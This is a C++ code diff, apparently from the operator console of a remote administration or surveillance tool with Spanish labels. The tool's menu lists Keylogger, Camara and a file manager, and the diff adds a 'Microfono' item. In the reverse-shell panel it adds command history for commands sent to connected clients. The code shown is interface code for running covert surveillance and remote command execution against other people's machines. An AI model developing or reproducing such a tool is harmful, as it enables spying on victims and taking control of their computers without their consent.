@@ -47,6 +47,7 @@ FrameCliente::FrameCliente(std::string strID, wxString nameID)
     this->m_tree->AppendItem(rootAdmin, wxT("Administrador de archivos"));
 
     this->m_tree->AppendItem(rootSurveilance, wxT("Keylogger"));
+    this->m_tree->AppendItem(rootSurveilance, wxT("Microfono"));
     this->m_tree->AppendItem(rootSurveilance, wxT("Camara"));
     
     this->m_tree->AppendItem(rootMisc, wxT("Testing"));
@@ -200,7 +201,6 @@ panelReverseShell::panelReverseShell(wxWindow* pParent) :
     this->txtConsole->SetForegroundColour(*wxWHITE);
     this->txtConsole->SetBackgroundColour(*wxBLACK);
 
-    Bind(wxEVT_TEXT, &panelReverseShell::OnText, this);
     Bind(wxEVT_CHAR_HOOK, &panelReverseShell::OnHook, this);
 
     //Enviar comando al cliente para que ejecute
@@ -218,11 +218,6 @@ panelReverseShell::panelReverseShell(wxWindow* pParent) :
 
 }
 
-void panelReverseShell::OnText(wxCommandEvent& event) {
-    //wxTextCtrl* win = (wxTextCtrl*)event.GetEventObject();
-    //std::cout << "CURRENT: " << win->GetInsertionPoint() << " - LAST: " << win->GetLastPosition() << " - SAVE: " <<this->p_uliUltimo <<std::endl;
-}
-
 void panelReverseShell::OnHook(wxKeyEvent& event) {
     //long last_position = this->txtConsole->GetLastPosition();
     long current_pos = this->txtConsole->GetInsertionPoint();
@@ -236,10 +231,32 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
         }
     }else if (iCode == WXK_UP) {
         //Historial de comandos?
+        if (this->vc_History.size() > 0) {
+            if (this->iHistorialPos > 0) {
+                this->iHistorialPos--;
+            }
+            this->txtConsole->Remove(this->p_uliUltimo, this->txtConsole->GetLastPosition());
+            wxString strTmp = this->vc_History[this->iHistorialPos];
+            this->txtConsole->AppendText(strTmp);
+            std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;
+        }
+    }else if (iCode == WXK_DOWN) {
+        if (this->vc_History.size() > 0) {
+            if (this->iHistorialPos + 1 < this->vc_History.size()) {
+                this->iHistorialPos++;
+            }
+            this->txtConsole->Remove(this->p_uliUltimo, this->txtConsole->GetLastPosition());
+            wxString strTmp = this->vc_History[this->iHistorialPos];
+            this->txtConsole->AppendText(strTmp);
+            std::cout << "HISTORIAL: [" << this->iHistorialPos << "] " << strTmp << std::endl;
+            
+        }
     }else if (iCode == WXK_RETURN) {
         wxString strRandomOut = this->txtConsole->GetLineText(this->txtConsole->GetNumberOfLines()-1);
         int iLongitud = this->txtConsole->GetLastPosition() - this->p_uliUltimo;
         wxString str1 = strRandomOut.substr((strRandomOut.length() - iLongitud), strRandomOut.length());
+        this->vc_History.push_back(str1);
+
         str1.append(1, '\r');
         str1.append(1, '\n');
         std::vector<struct Cliente> vc_Copy;
